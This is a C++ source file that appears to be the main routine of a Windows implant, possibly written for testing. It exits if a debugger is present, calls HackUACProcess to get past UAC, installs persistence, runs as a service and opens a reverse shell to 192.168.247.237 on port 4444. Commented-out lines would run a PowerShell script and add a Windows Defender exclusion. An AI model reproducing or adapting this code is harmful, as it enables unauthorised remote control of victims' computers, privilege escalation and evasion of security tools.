#pragma once
#include "shell.h"
#include "UAC.h"
#include "attachment.h"
#include "service.h"
#include "emulchk.h"
#include <fstream>

SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;
void readmeTxt();
void IamLittleCat() {
    CloseHandle(0);
    while (CheckIsDebuggerPresent()) {
        readmeTxt(); exit(0);
            
           
    }

    return;
      
}


void readmeTxt() {
    std::string desktopPath = std::string(getenv("USERPROFILE")) + "\\Desktop\\";
    std::cout << desktopPath << std::endl;
    std::ofstream myfile;
    std::string path = desktopPath + "README.txt";
    
    myfile.open(path, std::ios::out);
    myfile << "payload testing programm running . Sc delete persistence to unload"; //какой-то текст
    myfile.close();
}

int main()
{
    IamLittleCat();
    readmeTxt();
    DWORD integrity_level = GetProcessIntegrityLevel();
    if (integrity_level < SECURITY_MANDATORY_HIGH_RID) {
        IamLittleCat();
        HackUACProcess();
        return 0;
        //fileFromBuf(L"hack.ps1", hexData, 4508);
        //system("powershell.exe < hack.ps1");
       
        
    }
    IamLittleCat();
   // system("powershell -Command Add-MpPreference -ExclusionPath \"C:\\Users\\admin\\Desktop\"");
    persistence();

    if (integrity_level < SECURITY_MANDATORY_SYSTEM_RID) return 0;


    // TO_DO: Add any additional services for the process to this table.
    SERVICE_TABLE_ENTRY DispatchTable[] =
    {
        { (LPWSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain },
        { NULL, NULL }
    };

    // This call returns when the service has stopped. 
   // The process should simply terminate when the call returns.

    if (!StartServiceCtrlDispatcher(DispatchTable))
    {
        return 1;
    }


    
    const char* ip = "192.168.247.237";
    short port = 4444;
    IamLittleCat();
    ReverseShell(ip, port);
	return 0;
}


